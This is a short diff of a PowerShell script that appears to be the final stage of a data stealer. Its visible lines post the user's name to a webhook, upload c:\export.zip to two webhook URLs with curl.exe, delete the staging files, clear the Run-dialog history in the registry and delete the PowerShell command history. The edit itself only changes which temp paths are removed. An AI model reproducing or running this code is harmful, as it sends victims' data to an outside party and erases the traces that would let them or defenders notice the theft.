@@ -10,9 +10,9 @@ $Body = @{'username' = $env:username; 'content' = "Magia pura"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post; curl.exe -F 'file1=@c:\export.zip' $hookurl
 Start-Sleep -Seconds 1.5
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post; curl.exe -F 'file1=@c:\export.zip' $hookurl2
-rm -r C:\temp
+rm -r C:\temp\apt
 rm -r C:\export.zip
-
+rm -r C:\temp\j.txt
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
